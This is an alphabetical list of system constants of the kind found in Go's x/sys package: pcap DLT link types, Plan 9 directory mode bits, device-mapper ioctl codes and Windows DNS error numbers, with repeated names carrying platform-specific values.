DLT_ISO_14443                  = 0x108
DLT_JUNIPER_ATM1                        = 0x89
DLT_JUNIPER_ATM1                  = 0x89
DLT_JUNIPER_ATM1               = 0x89
DLT_JUNIPER_ATM1              = 0x89
DLT_JUNIPER_ATM2                        = 0x87
DLT_JUNIPER_ATM2                  = 0x87
DLT_JUNIPER_ATM2               = 0x87
DLT_JUNIPER_ATM2              = 0x87
DLT_JUNIPER_ATM_CEMIC                   = 0xee
DLT_JUNIPER_ATM_CEMIC             = 0xee
DLT_JUNIPER_ATM_CEMIC          = 0xee
DLT_JUNIPER_CHDLC                       = 0xb5
DLT_JUNIPER_CHDLC                 = 0xb5
DLT_JUNIPER_CHDLC              = 0xb5
DLT_JUNIPER_CHDLC             = 0xb5
DLT_JUNIPER_ES                          = 0x84
DLT_JUNIPER_ES                    = 0x84
DLT_JUNIPER_ES                 = 0x84
DLT_JUNIPER_ES                = 0x84
DLT_JUNIPER_ETHER                       = 0xb2
DLT_JUNIPER_ETHER                 = 0xb2
DLT_JUNIPER_ETHER              = 0xb2
DLT_JUNIPER_ETHER             = 0xb2
DLT_JUNIPER_FIBRECHANNEL                = 0xea
DLT_JUNIPER_FIBRECHANNEL          = 0xea
DLT_JUNIPER_FIBRECHANNEL       = 0xea
DLT_JUNIPER_FRELAY                      = 0xb4
DLT_JUNIPER_FRELAY                = 0xb4
DLT_JUNIPER_FRELAY             = 0xb4
DLT_JUNIPER_FRELAY            = 0xb4
DLT_JUNIPER_GGSN                        = 0x85
DLT_JUNIPER_GGSN                  = 0x85
DLT_JUNIPER_GGSN               = 0x85
DLT_JUNIPER_GGSN              = 0x85
DLT_JUNIPER_ISM                         = 0xc2
DLT_JUNIPER_ISM                   = 0xc2
DLT_JUNIPER_ISM                = 0xc2
DLT_JUNIPER_MFR                         = 0x86
DLT_JUNIPER_MFR                   = 0x86
DLT_JUNIPER_MFR                = 0x86
DLT_JUNIPER_MFR               = 0x86
DLT_JUNIPER_MLFR                        = 0x83
DLT_JUNIPER_MLFR                  = 0x83
DLT_JUNIPER_MLFR               = 0x83
DLT_JUNIPER_MLFR              = 0x83
DLT_JUNIPER_MLPPP                       = 0x82
DLT_JUNIPER_MLPPP                 = 0x82
DLT_JUNIPER_MLPPP              = 0x82
DLT_JUNIPER_MLPPP             = 0x82
DLT_JUNIPER_MONITOR                     = 0xa4
DLT_JUNIPER_MONITOR               = 0xa4
DLT_JUNIPER_MONITOR            = 0xa4
DLT_JUNIPER_MONITOR           = 0xa4
DLT_JUNIPER_PIC_PEER                    = 0xae
DLT_JUNIPER_PIC_PEER              = 0xae
DLT_JUNIPER_PIC_PEER           = 0xae
DLT_JUNIPER_PIC_PEER          = 0xae
DLT_JUNIPER_PPP                         = 0xb3
DLT_JUNIPER_PPP                   = 0xb3
DLT_JUNIPER_PPP                = 0xb3
DLT_JUNIPER_PPP               = 0xb3
DLT_JUNIPER_PPPOE                       = 0xa7
DLT_JUNIPER_PPPOE                 = 0xa7
DLT_JUNIPER_PPPOE              = 0xa7
DLT_JUNIPER_PPPOE             = 0xa7
DLT_JUNIPER_PPPOE_ATM                   = 0xa8
DLT_JUNIPER_PPPOE_ATM             = 0xa8
DLT_JUNIPER_PPPOE_ATM          = 0xa8
DLT_JUNIPER_PPPOE_ATM         = 0xa8
DLT_JUNIPER_SERVICES                    = 0x88
DLT_JUNIPER_SERVICES              = 0x88
DLT_JUNIPER_SERVICES           = 0x88
DLT_JUNIPER_SERVICES          = 0x88
DLT_JUNIPER_SRX_E2E                     = 0xe9
DLT_JUNIPER_SRX_E2E               = 0xe9
DLT_JUNIPER_SRX_E2E            = 0xe9
DLT_JUNIPER_ST                          = 0xc8
DLT_JUNIPER_ST                    = 0xc8
DLT_JUNIPER_ST                 = 0xc8
DLT_JUNIPER_VP                          = 0xb7
DLT_JUNIPER_VP                    = 0xb7
DLT_JUNIPER_VP                 = 0xb7
DLT_JUNIPER_VS                          = 0xe8
DLT_JUNIPER_VS                    = 0xe8
DLT_JUNIPER_VS                 = 0xe8
DLT_LAPB_WITH_DIR                       = 0xcf
DLT_LAPB_WITH_DIR                 = 0xcf
DLT_LAPB_WITH_DIR              = 0xcf
DLT_LAPD                                = 0xcb
DLT_LAPD                          = 0xcb
DLT_LAPD                       = 0xcb
DLT_LIN                                 = 0xd4
DLT_LIN                           = 0xd4
DLT_LIN                        = 0xd4
DLT_LINUX_EVDEV                         = 0xd8
DLT_LINUX_EVDEV                   = 0xd8
DLT_LINUX_EVDEV                = 0xd8
DLT_LINUX_IRDA                          = 0x90
DLT_LINUX_IRDA                    = 0x90
DLT_LINUX_IRDA                 = 0x90
DLT_LINUX_IRDA                = 0x90
DLT_LINUX_LAPD                          = 0xb1
DLT_LINUX_LAPD                    = 0xb1
DLT_LINUX_LAPD                 = 0xb1
DLT_LINUX_LAPD                = 0xb1
DLT_LINUX_PPP_WITHDIRECTION             = 0xa6
DLT_LINUX_PPP_WITHDIRECTION    = 0xa6
DLT_LINUX_SLL                           = 0x71
DLT_LINUX_SLL                     = 0x71
DLT_LINUX_SLL                  = 0x71
DLT_LINUX_SLL                 = 0x71
DLT_LOOP                                = 0x6c
DLT_LOOP                          = 0x6c
DLT_LOOP                          = 0xc
DLT_LOOP                       = 0x6c
DLT_LOOP                      = 0x6c
DLT_LORATAP                    = 0x10e
DLT_LTALK                               = 0x72
DLT_LTALK                         = 0x72
DLT_LTALK                      = 0x72
DLT_LTALK                     = 0x72
DLT_MATCHING_MAX                        = 0x10a
DLT_MATCHING_MAX                  = 0x109
DLT_MATCHING_MAX               = 0x109
DLT_MATCHING_MAX               = 0x113
DLT_MATCHING_MIN                        = 0x68
DLT_MATCHING_MIN                  = 0x68
DLT_MATCHING_MIN               = 0x68
DLT_MFR                                 = 0xb6
DLT_MFR                           = 0xb6
DLT_MFR                        = 0xb6
DLT_MOST                                = 0xd3
DLT_MOST                          = 0xd3
DLT_MOST                       = 0xd3
DLT_MPEG_2_TS                           = 0xf3
DLT_MPEG_2_TS                     = 0xf3
DLT_MPEG_2_TS                  = 0xf3
DLT_MPLS                                = 0xdb
DLT_MPLS                          = 0xdb
DLT_MPLS                       = 0xdb
DLT_MTP2                                = 0x8c
DLT_MTP2                          = 0x8c
DLT_MTP2                       = 0x8c
DLT_MTP2                      = 0x8c
DLT_MTP2_WITH_PHDR                      = 0x8b
DLT_MTP2_WITH_PHDR                = 0x8b
DLT_MTP2_WITH_PHDR             = 0x8b
DLT_MTP2_WITH_PHDR            = 0x8b
DLT_MTP3                                = 0x8d
DLT_MTP3                          = 0x8d
DLT_MTP3                       = 0x8d
DLT_MTP3                      = 0x8d
DLT_MUX27010                            = 0xec
DLT_MUX27010                      = 0xec
DLT_MUX27010                   = 0xec
DLT_NETANALYZER                         = 0xf0
DLT_NETANALYZER                   = 0xf0
DLT_NETANALYZER                = 0xf0
DLT_NETANALYZER_TRANSPARENT             = 0xf1
DLT_NETANALYZER_TRANSPARENT       = 0xf1
DLT_NETANALYZER_TRANSPARENT    = 0xf1
DLT_NETLINK                       = 0xfd
DLT_NETLINK                    = 0xfd
DLT_NFC_LLCP                            = 0xf5
DLT_NFC_LLCP                      = 0xf5
DLT_NFC_LLCP                   = 0xf5
DLT_NFLOG                               = 0xef
DLT_NFLOG                         = 0xef
DLT_NFLOG                      = 0xef
DLT_NG40                                = 0xf4
DLT_NG40                          = 0xf4
DLT_NG40                       = 0xf4
DLT_NORDIC_BLE                 = 0x110
DLT_NULL                                = 0x0
DLT_NULL                          = 0x0
DLT_NULL                       = 0x0
DLT_NULL                      = 0x0
DLT_OPENFLOW                      = 0x10b
DLT_OPENFLOW                   = 0x10b
DLT_PCI_EXP                             = 0x7d
DLT_PCI_EXP                       = 0x7d
DLT_PCI_EXP                    = 0x7d
DLT_PCI_EXP                   = 0x7d
DLT_PFLOG                               = 0x75
DLT_PFLOG                         = 0x75
DLT_PFLOG                      = 0x75
DLT_PFLOG                     = 0x75
DLT_PFSYNC                              = 0x12
DLT_PFSYNC                        = 0x12
DLT_PFSYNC                     = 0x79
DLT_PFSYNC                    = 0x12
DLT_PKTAP                         = 0x102
DLT_PKTAP                      = 0x102
DLT_PPI                                 = 0xc0
DLT_PPI                           = 0xc0
DLT_PPI                        = 0xc0
DLT_PPP                                 = 0x9
DLT_PPP                           = 0x9
DLT_PPP                        = 0x9
DLT_PPP                       = 0x9
DLT_PPP_BSDOS                           = 0x10
DLT_PPP_BSDOS                     = 0x10
DLT_PPP_BSDOS                     = 0xe
DLT_PPP_BSDOS                  = 0xe
DLT_PPP_BSDOS                 = 0xe
DLT_PPP_ETHER                           = 0x33
DLT_PPP_ETHER                     = 0x33
DLT_PPP_ETHER                  = 0x33
DLT_PPP_PPPD                            = 0xa6
DLT_PPP_PPPD                      = 0xa6
DLT_PPP_PPPD                   = 0xa6
DLT_PPP_PPPD                  = 0xa6
DLT_PPP_SERIAL                          = 0x32
DLT_PPP_SERIAL                    = 0x32
DLT_PPP_SERIAL                 = 0x32
DLT_PPP_WITH_DIR                        = 0xcc
DLT_PPP_WITH_DIR                  = 0xcc
DLT_PPP_WITH_DIR               = 0xcc
DLT_PPP_WITH_DIRECTION                  = 0xa6
DLT_PPP_WITH_DIRECTION         = 0xa6
DLT_PRISM_HEADER                        = 0x77
DLT_PRISM_HEADER                  = 0x77
DLT_PRISM_HEADER               = 0x77
DLT_PRISM_HEADER              = 0x77
DLT_PROFIBUS_DL                   = 0x101
DLT_PROFIBUS_DL                = 0x101
DLT_PRONET                              = 0x4
DLT_PRONET                        = 0x4
DLT_PRONET                     = 0x4
DLT_PRONET                    = 0x4
DLT_RAIF1                               = 0xc6
DLT_RAIF1                         = 0xc6
DLT_RAIF1                      = 0xc6
DLT_RAW                                 = 0xc
DLT_RAW                           = 0xc
DLT_RAW                           = 0xe
DLT_RAW                        = 0xc
DLT_RAW                       = 0xc
DLT_RAWAF_MASK                    = 0x2240000
DLT_RAWAF_MASK                = 0x2240000
DLT_RDS                           = 0x109
DLT_RDS                        = 0x109
DLT_REDBACK_SMARTEDGE             = 0x20
DLT_REDBACK_SMARTEDGE          = 0x20
DLT_RIO                                 = 0x7c
DLT_RIO                           = 0x7c
DLT_RIO                        = 0x7c
DLT_RIO                       = 0x7c
DLT_RTAC_SERIAL                   = 0xfa
DLT_RTAC_SERIAL                = 0xfa
DLT_SCCP                                = 0x8e
DLT_SCCP                          = 0x8e
DLT_SCCP                       = 0x8e
DLT_SCCP                      = 0x8e
DLT_SCTP                          = 0xf8
DLT_SCTP                       = 0xf8
DLT_SDLC                       = 0x10c
DLT_SITA                                = 0xc4
DLT_SITA                          = 0xc4
DLT_SITA                       = 0xc4
DLT_SLIP                                = 0x8
DLT_SLIP                          = 0x8
DLT_SLIP                       = 0x8
DLT_SLIP                      = 0x8
DLT_SLIP_BSDOS                          = 0xf
DLT_SLIP_BSDOS                    = 0xd
DLT_SLIP_BSDOS                    = 0xf
DLT_SLIP_BSDOS                 = 0xd
DLT_SLIP_BSDOS                = 0xd
DLT_STANAG_5066_D_PDU                   = 0xed
DLT_STANAG_5066_D_PDU             = 0xed
DLT_STANAG_5066_D_PDU          = 0xed
DLT_SUNATM                              = 0x7b
DLT_SUNATM                        = 0x7b
DLT_SUNATM                     = 0x7b
DLT_SUNATM                    = 0x7b
DLT_SYMANTEC_FIREWALL                   = 0x63
DLT_SYMANTEC_FIREWALL             = 0x63
DLT_SYMANTEC_FIREWALL          = 0x63
DLT_SYMANTEC_FIREWALL         = 0x63
DLT_TI_LLN_SNIFFER             = 0x10d
DLT_TZSP                                = 0x80
DLT_TZSP                          = 0x80
DLT_TZSP                       = 0x80
DLT_TZSP                      = 0x80
DLT_USB                                 = 0xba
DLT_USB                           = 0xba
DLT_USB                        = 0xba
DLT_USBPCAP                       = 0xf9
DLT_USBPCAP                    = 0xf9
DLT_USB_DARWIN                          = 0x10a
DLT_USB_DARWIN                 = 0x10a
DLT_USB_FREEBSD                   = 0xba
DLT_USB_FREEBSD                = 0xba
DLT_USB_LINUX                           = 0xbd
DLT_USB_LINUX                     = 0xbd
DLT_USB_LINUX                  = 0xbd
DLT_USB_LINUX_MMAPPED                   = 0xdc
DLT_USB_LINUX_MMAPPED             = 0xdc
DLT_USB_LINUX_MMAPPED          = 0xdc
DLT_USER0                               = 0x93
DLT_USER0                         = 0x93
DLT_USER0                      = 0x93
DLT_USER1                               = 0x94
DLT_USER1                         = 0x94
DLT_USER1                      = 0x94
DLT_USER10                              = 0x9d
DLT_USER10                        = 0x9d
DLT_USER10                     = 0x9d
DLT_USER11                              = 0x9e
DLT_USER11                        = 0x9e
DLT_USER11                     = 0x9e
DLT_USER12                              = 0x9f
DLT_USER12                        = 0x9f
DLT_USER12                     = 0x9f
DLT_USER13                              = 0xa0
DLT_USER13                        = 0xa0
DLT_USER13                     = 0xa0
DLT_USER14                              = 0xa1
DLT_USER14                        = 0xa1
DLT_USER14                     = 0xa1
DLT_USER15                              = 0xa2
DLT_USER15                        = 0xa2
DLT_USER15                     = 0xa2
DLT_USER2                               = 0x95
DLT_USER2                         = 0x95
DLT_USER2                      = 0x95
DLT_USER3                               = 0x96
DLT_USER3                         = 0x96
DLT_USER3                      = 0x96
DLT_USER4                               = 0x97
DLT_USER4                         = 0x97
DLT_USER4                      = 0x97
DLT_USER5                               = 0x98
DLT_USER5                         = 0x98
DLT_USER5                      = 0x98
DLT_USER6                               = 0x99
DLT_USER6                         = 0x99
DLT_USER6                      = 0x99
DLT_USER7                               = 0x9a
DLT_USER7                         = 0x9a
DLT_USER7                      = 0x9a
DLT_USER8                               = 0x9b
DLT_USER8                         = 0x9b
DLT_USER8                      = 0x9b
DLT_USER9                               = 0x9c
DLT_USER9                         = 0x9c
DLT_USER9                      = 0x9c
DLT_VSOCK                      = 0x10f
DLT_WATTSTOPPER_DLM               = 0x107
DLT_WATTSTOPPER_DLM            = 0x107
DLT_WIHART                              = 0xdf
DLT_WIHART                        = 0xdf
DLT_WIHART                     = 0xdf
DLT_WIRESHARK_UPPER_PDU           = 0xfc
DLT_WIRESHARK_UPPER_PDU        = 0xfc
DLT_X2E_SERIAL                          = 0xd5
DLT_X2E_SERIAL                    = 0xd5
DLT_X2E_SERIAL                 = 0xd5
DLT_X2E_XORAYA                          = 0xd6
DLT_X2E_XORAYA                    = 0xd6
DLT_X2E_XORAYA                 = 0xd6
DLT_ZWAVE_R1_R2                   = 0x105
DLT_ZWAVE_R1_R2                = 0x105
DLT_ZWAVE_R3                      = 0x106
DLT_ZWAVE_R3                   = 0x106
DMAPPEND = 0x40000000
DMAUTH   = 0x08000000
DMA_BUF_MAGIC                               = 0x444d4142
DMDIR    = 0x80000000
DMEXCL   = 0x20000000
DMEXEC   = 0x1
DMMOUNT  = 0x10000000
DMREAD   = 0x4
DMTMP    = 0x04000000
DMWRITE  = 0x2
DM_/ 
DM_ACTIVE_PRESENT_FLAG                      = 0x20
DM_BUFFER_FULL_FLAG                         = 0x100
DM_DATA_OUT_FLAG                            = 0x10000
DM_DEFERRED_REMOVE                          = 0x20000
DM_DEV_ARM_POLL                             = 0xc138fd10
DM_DEV_CREATE                               = 0xc138fd03
DM_DEV_REMOVE                               = 0xc138fd04
DM_DEV_RENAME                               = 0xc138fd05
DM_DEV_SET_GEOMETRY                         = 0xc138fd0f
DM_DEV_STATUS                               = 0xc138fd07
DM_DEV_SUSPEND                              = 0xc138fd06
DM_DEV_WAIT                                 = 0xc138fd08
DM_GET_TARGET_VERSION                       = 0xc138fd11
DM_IMA_MEASUREMENT_FLAG                     = 0x80000
DM_INACTIVE_PRESENT_FLAG                    = 0x40
DM_INTERNAL_SUSPEND_FLAG                    = 0x40000
DM_IOCTL                                    = 0xfd
DM_LIST_DEVICES                             = 0xc138fd02
DM_LIST_VERSIONS                            = 0xc138fd0d
DM_MAX_TYPE_NAME                            = 0x10
DM_NAME_LEN                                 = 0x80
DM_NAME_LIST_FLAG_DOESNT_HAVE_UUID          = 0x2
DM_NAME_LIST_FLAG_HAS_UUID                  = 0x1
DM_NOFLUSH_FLAG                             = 0x800
DM_PERSISTENT_DEV_FLAG                      = 0x8
DM_QUERY_INACTIVE_TABLE_FLAG                = 0x1000
DM_READONLY_FLAG                            = 0x1
DM_REMOVE_ALL                               = 0xc138fd01
DM_SECURE_DATA_FLAG                         = 0x8000
DM_SKIP_BDGET_FLAG                          = 0x200
DM_SKIP_LOCKFS_FLAG                         = 0x400
DM_STATUS_TABLE_FLAG                        = 0x10
DM_SUSPEND_FLAG                             = 0x2
DM_TABLE_CLEAR                              = 0xc138fd0a
DM_TABLE_DEPS                               = 0xc138fd0b
DM_TABLE_LOAD                               = 0xc138fd09
DM_TABLE_STATUS                             = 0xc138fd0c
DM_TARGET_MSG                               = 0xc138fd0e
DM_UEVENT_GENERATED_FLAG                    = 0x2000
DM_UUID_FLAG                                = 0x4000
DM_UUID_LEN                                 = 0x81
DM_VERSION                                  = 0xc138fd00
DM_VERSION_MAJOR                            = 0x4
DM_VERSION_MINOR                            = 0x2e
DM_VERSION_PATCHLEVEL                       = 0x0
DNSRecord
DNS_ERROR_ADDRESS_REQUIRED                                                syscall.Errno = 9573
DNS_ERROR_ALIAS_LOOP                                                      syscall.Errno = 9722
DNS_ERROR_AUTOZONE_ALREADY_EXISTS                                         syscall.Errno = 9610
DNS_ERROR_AXFR                                                            syscall.Errno = 9752
DNS_ERROR_BACKGROUND_LOADING                                              syscall.Errno = 9568
DNS_ERROR_BAD_KEYMASTER                                                   syscall.Errno = 9122
DNS_ERROR_BAD_PACKET                                                      syscall.Errno = 9502
DNS_ERROR_CANNOT_FIND_ROOT_HINTS                                          syscall.Errno = 9564
DNS_ERROR_CLIENT_SUBNET_ALREADY_EXISTS                                    syscall.Errno = 9977
DNS_ERROR_CLIENT_SUBNET_DOES_NOT_EXIST                                    syscall.Errno = 9976
DNS_ERROR_CLIENT_SUBNET_IS_ACCESSED                                       syscall.Errno = 9975
DNS_ERROR_CNAME_COLLISION                                                 syscall.Errno = 9709
DNS_ERROR_CNAME_LOOP                                                      syscall.Errno = 9707
DNS_ERROR_DATABASE_BASE                                                   syscall.Errno = 9700
DNS_ERROR_DATAFILE_BASE                                                   syscall.Errno = 9650
DNS_ERROR_DATAFILE_OPEN_FAILURE                                           syscall.Errno = 9653
DNS_ERROR_DATAFILE_PARSING                                                syscall.Errno = 9655
DNS_ERROR_DEFAULT_SCOPE                                                   syscall.Errno = 9960
DNS_ERROR_DEFAULT_VIRTUALIZATION_INSTANCE                                 syscall.Errno = 9925
DNS_ERROR_DEFAULT_ZONESCOPE                                               syscall.Errno = 9953
DNS_ERROR_DELEGATION_REQUIRED                                             syscall.Errno = 9571
DNS_ERROR_DNAME_COLLISION                                                 syscall.Errno = 9721
DNS_ERROR_DNSSEC_BASE                                                     syscall.Errno = 9100
DNS_ERROR_DNSSEC_IS_DISABLED                                              syscall.Errno = 9125
DNS_ERROR_DP_ALREADY_ENLISTED                                             syscall.Errno = 9904
DNS_ERROR_DP_ALREADY_EXISTS                                               syscall.Errno = 9902
DNS_ERROR_DP_BASE                                                         syscall.Errno = 9900
DNS_ERROR_DP_DOES_NOT_EXIST                                               syscall.Errno = 9901
DNS_ERROR_DP_FSMO_ERROR                                                   syscall.Errno = 9906
DNS_ERROR_DP_NOT_AVAILABLE                                                syscall.Errno = 9905
DNS_ERROR_DP_NOT_ENLISTED                                                 syscall.Errno = 9903
DNS_ERROR_DS_UNAVAILABLE                                                  syscall.Errno = 9717
DNS_ERROR_DS_ZONE_ALREADY_EXISTS                                          syscall.Errno = 9718
DNS_ERROR_DWORD_VALUE_TOO_LARGE                                           syscall.Errno = 9567
DNS_ERROR_DWORD_VALUE_TOO_SMALL                                           syscall.Errno = 9566
DNS_ERROR_FILE_WRITEBACK_FAILED                                           syscall.Errno = 9654
DNS_ERROR_FORWARDER_ALREADY_EXISTS                                        syscall.Errno = 9619
DNS_ERROR_GENERAL_API_BASE                                                syscall.Errno = 9550
DNS_ERROR_INCONSISTENT_ROOT_HINTS                                         syscall.Errno = 9565
DNS_ERROR_INVAILD_VIRTUALIZATION_INSTANCE_NAME                            syscall.Errno = 9924
DNS_ERROR_INVALID_CLIENT_SUBNET_NAME                                      syscall.Errno = 9984
DNS_ERROR_INVALID_DATA                                                                  = ERROR_INVALID_DATA
DNS_ERROR_INVALID_DATAFILE_NAME                                           syscall.Errno = 9652
DNS_ERROR_INVALID_INITIAL_ROLLOVER_OFFSET                                 syscall.Errno = 9115
DNS_ERROR_INVALID_IP_ADDRESS                                              syscall.Errno = 9552
DNS_ERROR_INVALID_KEY_SIZE                                                syscall.Errno = 9106
DNS_ERROR_INVALID_NAME                                                                  = ERROR_INVALID_NAME
DNS_ERROR_INVALID_NAME_CHAR                                               syscall.Errno = 9560
DNS_ERROR_INVALID_NSEC3_ITERATION_COUNT                                   syscall.Errno = 9124
DNS_ERROR_INVALID_POLICY_TABLE                                            syscall.Errno = 9572
DNS_ERROR_INVALID_PROPERTY                                                syscall.Errno = 9553
DNS_ERROR_INVALID_ROLLOVER_PERIOD                                         syscall.Errno = 9114
DNS_ERROR_INVALID_SCOPE_NAME                                              syscall.Errno = 9958
DNS_ERROR_INVALID_SCOPE_OPERATION                                         syscall.Errno = 9961
DNS_ERROR_INVALID_SIGNATURE_VALIDITY_PERIOD                               syscall.Errno = 9123
DNS_ERROR_INVALID_TYPE                                                    syscall.Errno = 9551
DNS_ERROR_INVALID_XML                                                     syscall.Errno = 9126
DNS_ERROR_INVALID_ZONESCOPE_NAME                                          syscall.Errno = 9954
DNS_ERROR_INVALID_ZONE_OPERATION                                          syscall.Errno = 9603
DNS_ERROR_INVALID_ZONE_TYPE                                               syscall.Errno = 9611
DNS_ERROR_KEYMASTER_REQUIRED                                              syscall.Errno = 9101
DNS_ERROR_KSP_DOES_NOT_SUPPORT_PROTECTION                                 syscall.Errno = 9108
DNS_ERROR_KSP_NOT_ACCESSIBLE                                              syscall.Errno = 9112
DNS_ERROR_LOAD_ZONESCOPE_FAILED                                           syscall.Errno = 9956
DNS_ERROR_MASK                                                            syscall.Errno = 0x00002328
DNS_ERROR_NAME_DOES_NOT_EXIST                                             syscall.Errno = 9714
DNS_ERROR_NAME_NOT_IN_ZONE                                                syscall.Errno = 9706
DNS_ERROR_NBSTAT_INIT_FAILED                                              syscall.Errno = 9617
DNS_ERROR_NEED_SECONDARY_ADDRESSES                                        syscall.Errno = 9614
DNS_ERROR_NEED_WINS_SERVERS                                               syscall.Errno = 9616
DNS_ERROR_NODE_CREATION_FAILED                                            syscall.Errno = 9703
DNS_ERROR_NODE_IS_CNAME                                                   syscall.Errno = 9708
DNS_ERROR_NODE_IS_DNAME                                                   syscall.Errno = 9720
DNS_ERROR_NON_RFC_NAME                                                    syscall.Errno = 9556
DNS_ERROR_NOT_ALLOWED_ON_ACTIVE_SKD                                       syscall.Errno = 9119
DNS_ERROR_NOT_ALLOWED_ON_RODC                                             syscall.Errno = 9569
DNS_ERROR_NOT_ALLOWED_ON_ROOT_SERVER                                      syscall.Errno = 9562
DNS_ERROR_NOT_ALLOWED_ON_SIGNED_ZONE                                      syscall.Errno = 9102
DNS_ERROR_NOT_ALLOWED_ON_UNSIGNED_ZONE                                    syscall.Errno = 9121
DNS_ERROR_NOT_ALLOWED_ON_ZSK                                              syscall.Errno = 9118
DNS_ERROR_NOT_ALLOWED_UNDER_DELEGATION                                    syscall.Errno = 9563
DNS_ERROR_NOT_ALLOWED_UNDER_DNAME                                         syscall.Errno = 9570
DNS_ERROR_NOT_ALLOWED_WITH_ZONESCOPES                                     syscall.Errno = 9955
DNS_ERROR_NOT_ENOUGH_SIGNING_KEY_DESCRIPTORS                              syscall.Errno = 9104
DNS_ERROR_NOT_UNIQUE                                                      syscall.Errno = 9555
DNS_ERROR_NO_BOOTFILE_IF_DS_ZONE                                          syscall.Errno = 9719
DNS_ERROR_NO_CREATE_CACHE_DATA                                            syscall.Errno = 9713
DNS_ERROR_NO_DNS_SERVERS                                                  syscall.Errno = 9852
DNS_ERROR_NO_MEMORY                                                                     = ERROR_OUTOFMEMORY
DNS_ERROR_NO_PACKET                                                       syscall.Errno = 9503
DNS_ERROR_NO_TCPIP                                                        syscall.Errno = 9851
DNS_ERROR_NO_VALID_TRUST_ANCHORS                                          syscall.Errno = 9127
DNS_ERROR_NO_ZONE_INFO                                                    syscall.Errno = 9602
DNS_ERROR_NSEC3_INCOMPATIBLE_WITH_RSA_SHA1                                syscall.Errno = 9103
DNS_ERROR_NSEC3_NAME_COLLISION                                            syscall.Errno = 9129
DNS_ERROR_NSEC_INCOMPATIBLE_WITH_NSEC3_RSA_SHA1                           syscall.Errno = 9130
DNS_ERROR_NUMERIC_NAME                                                    syscall.Errno = 9561
DNS_ERROR_OPERATION_BASE                                                  syscall.Errno = 9750
DNS_ERROR_PACKET_FMT_BASE                                                 syscall.Errno = 9500
DNS_ERROR_POLICY_ALREADY_EXISTS                                           syscall.Errno = 9971
DNS_ERROR_POLICY_DOES_NOT_EXIST                                           syscall.Errno = 9972
DNS_ERROR_POLICY_INVALID_CRITERIA                                         syscall.Errno = 9973
DNS_ERROR_POLICY_INVALID_CRITERIA_CLIENT_SUBNET                           syscall.Errno = 9990
DNS_ERROR_POLICY_INVALID_CRITERIA_FQDN                                    syscall.Errno = 9994
DNS_ERROR_POLICY_INVALID_CRITERIA_INTERFACE                               syscall.Errno = 9993
DNS_ERROR_POLICY_INVALID_CRITERIA_NETWORK_PROTOCOL                        syscall.Errno = 9992
DNS_ERROR_POLICY_INVALID_CRITERIA_QUERY_TYPE                              syscall.Errno = 9995
DNS_ERROR_POLICY_INVALID_CRITERIA_TIME_OF_DAY                             syscall.Errno = 9996
DNS_ERROR_POLICY_INVALID_CRITERIA_TRANSPORT_PROTOCOL                      syscall.Errno = 9991
DNS_ERROR_POLICY_INVALID_NAME                                             syscall.Errno = 9982
DNS_ERROR_POLICY_INVALID_SETTINGS                                         syscall.Errno = 9974
DNS_ERROR_POLICY_INVALID_WEIGHT                                           syscall.Errno = 9981
DNS_ERROR_POLICY_LOCKED                                                   syscall.Errno = 9980
DNS_ERROR_POLICY_MISSING_CRITERIA                                         syscall.Errno = 9983
DNS_ERROR_POLICY_PROCESSING_ORDER_INVALID                                 syscall.Errno = 9985
DNS_ERROR_POLICY_SCOPE_MISSING                                            syscall.Errno = 9986
DNS_ERROR_POLICY_SCOPE_NOT_ALLOWED                                        syscall.Errno = 9987
DNS_ERROR_PRIMARY_REQUIRES_DATAFILE                                       syscall.Errno = 9651
DNS_ERROR_RCODE                                                           syscall.Errno = 9504
DNS_ERROR_RCODE_BADKEY                                                    syscall.Errno = 9017
DNS_ERROR_RCODE_BADSIG                                                    syscall.Errno = 9016
DNS_ERROR_RCODE_BADTIME                                                   syscall.Errno = 9018
DNS_ERROR_RCODE_FORMAT_ERROR                                              syscall.Errno = 9001
DNS_ERROR_RCODE_LAST                                                                    = DNS_ERROR_RCODE_BADTIME
DNS_ERROR_RCODE_NAME_ERROR                                                syscall.Errno = 9003
DNS_ERROR_RCODE_NOTAUTH                                                   syscall.Errno = 9009
DNS_ERROR_RCODE_NOTZONE                                                   syscall.Errno = 9010
DNS_ERROR_RCODE_NOT_IMPLEMENTED                                           syscall.Errno = 9004
DNS_ERROR_RCODE_NO_ERROR                                                                = ERROR_SUCCESS
DNS_ERROR_RCODE_NXRRSET                                                   syscall.Errno = 9008
DNS_ERROR_RCODE_REFUSED                                                   syscall.Errno = 9005
DNS_ERROR_RCODE_SERVER_FAILURE                                            syscall.Errno = 9002
DNS_ERROR_RCODE_YXDOMAIN                                                  syscall.Errno = 9006
DNS_ERROR_RCODE_YXRRSET                                                   syscall.Errno = 9007
DNS_ERROR_RECORD_ALREADY_EXISTS                                           syscall.Errno = 9711
DNS_ERROR_RECORD_DOES_NOT_EXIST                                           syscall.Errno = 9701
DNS_ERROR_RECORD_FORMAT                                                   syscall.Errno = 9702
DNS_ERROR_RECORD_ONLY_AT_ZONE_ROOT                                        syscall.Errno = 9710
DNS_ERROR_RECORD_TIMED_OUT                                                syscall.Errno = 9705
DNS_ERROR_RESPONSE_CODES_BASE                                             syscall.Errno = 9000
DNS_ERROR_ROLLOVER_ALREADY_QUEUED                                         syscall.Errno = 9120
DNS_ERROR_ROLLOVER_IN_PROGRESS                                            syscall.Errno = 9116
DNS_ERROR_ROLLOVER_NOT_POKEABLE                                           syscall.Errno = 9128
DNS_ERROR_RRL_INVALID_IPV4_PREFIX                                         syscall.Errno = 9913
DNS_ERROR_RRL_INVALID_IPV6_PREFIX                                         syscall.Errno = 9914
DNS_ERROR_RRL_INVALID_LEAK_RATE                                           syscall.Errno = 9916
DNS_ERROR_RRL_INVALID_TC_RATE                                             syscall.Errno = 9915
DNS_ERROR_RRL_INVALID_WINDOW_SIZE                                         syscall.Errno = 9912
DNS_ERROR_RRL_LEAK_RATE_LESSTHAN_TC_RATE                                  syscall.Errno = 9917
DNS_ERROR_RRL_NOT_ENABLED                                                 syscall.Errno = 9911
DNS_ERROR_SCOPE_ALREADY_EXISTS                                            syscall.Errno = 9963
DNS_ERROR_SCOPE_DOES_NOT_EXIST                                            syscall.Errno = 9959
DNS_ERROR_SCOPE_LOCKED                                                    syscall.Errno = 9962
DNS_ERROR_SECONDARY_DATA                                                  syscall.Errno = 9712
DNS_ERROR_SECONDARY_REQUIRES_MASTER_IP                                    syscall.Errno = 9612
DNS_ERROR_SECURE_BASE                                                     syscall.Errno = 9800
DNS_ERROR_SERVERSCOPE_IS_REFERENCED                                       syscall.Errno = 9988
DNS_ERROR_SETUP_BASE                                                      syscall.Errno = 9850
DNS_ERROR_SIGNING_KEY_NOT_ACCESSIBLE                                      syscall.Errno = 9107
